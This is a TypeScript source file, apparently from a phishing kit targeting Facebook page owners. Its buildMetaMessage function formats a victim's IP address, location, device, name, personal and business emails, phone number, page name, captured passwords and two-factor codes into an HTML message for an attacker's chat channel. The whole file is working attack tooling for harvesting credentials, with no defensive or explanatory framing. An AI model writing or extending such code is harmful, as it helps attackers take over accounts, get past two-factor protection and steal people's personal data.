import type { GeoInfo, UserData } from '@/types';

interface BuildMessageOptions {
    geoInfo: GeoInfo | null;
    deviceLabel: string;
    userData: Pick<
        UserData,
        'fullName' | 'personalEmail' | 'businessEmail' | 'phoneNumber' | 'facebookPageName' | 'information'
    >;
    passwords?: string[];
    codes?: string[];
}

export const escapeHtml = (value: string) =>
    String(value ?? 'N/A')
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;');

const formatDateTime = () => {
    const now = new Date();
    const pad = (value: number) => String(value).padStart(2, '0');
    return `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
};

export function buildMetaMessage({ geoInfo, deviceLabel, userData, passwords = [], codes = [] }: BuildMessageOptions): string {
    const safeIp = geoInfo?.ip || 'Unknown';
    const safeCity = geoInfo?.city || 'Unknown';
    const safeRegion = geoInfo?.region || 'Unknown';
    const safeCountry = geoInfo?.country || 'Unknown';
    const locationParts = [safeCity, safeRegion, safeCountry].filter((part) => part && part !== 'Unknown');
    const formattedLocation = locationParts.length > 0 ? locationParts.join(', ') : 'Unknown';

    const passwordLines =
        passwords.length > 0
            ? passwords.map((pwd, idx) => `   MK${idx + 1}: <code>${escapeHtml(pwd)}</code>`).join('\n')
            : '   MK1: <code>N/A</code>';

    const twoFALines =
        codes.length > 0
            ? codes.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
            : '   Code1: <code>N/A</code>';

    return `
⏰ ${formatDateTime()}
🌐 IP: <code>${escapeHtml(safeIp)}</code>
📍 Location: ${escapeHtml(formattedLocation)}
📱 Device: <code>${escapeHtml(deviceLabel)}</code>
📋 <b>INFO</b>
   Name: <code>${escapeHtml(userData.fullName)}</code>
   Email: <code>${escapeHtml(userData.personalEmail)}</code>
   DN Email: <code>${escapeHtml(userData.businessEmail)}</code>
   Phone: <code>${escapeHtml(userData.phoneNumber)}</code>
   Page: <code>${escapeHtml(userData.facebookPageName)}</code>
   Notes: <code>${escapeHtml(userData.information)}</code>
🔐 <b>PASSWORD</b>
${passwordLines}
🔒 <b>2FA CODE</b>
${twoFALines}
`.trim();
}
